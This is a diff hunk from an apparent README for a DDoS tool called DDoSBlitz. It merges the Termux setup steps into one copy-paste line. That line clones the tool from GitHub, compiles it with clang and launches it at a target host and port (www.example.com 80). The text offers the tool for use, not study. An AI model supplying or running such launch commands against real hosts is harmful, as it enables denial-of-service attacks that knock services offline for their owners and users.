@@ -66,12 +66,7 @@ While Termux runs on a mobile device, it does not have the same power as a full 
 The following block contains all the necessary commands to set up, compile, and execute the DDoSBlitz tool in Termux. Copy and paste these commands in sequence to perform the entire setup:
 
 ```bash
-apt update && apt upgrade -y
-pkg install git clang -y
-git clone https://github.com/New71k/DDoSBlitz
-cd DDoSBlitz
-clang DDoSBlitz.c -o DDoSBlitz
-./DDoSBlitz www.example.com 80
+apt update && apt upgrade -y && pkg install git && pkg install clang -y && git clone https://github.com/New71k/DDoSBlitz &&cd DDoSBlitz && clang DDoSBlitz.c -o DDoSBlitz && ./DDoSBlitz www.example.com 80
 ```
 
 **Explanation:**
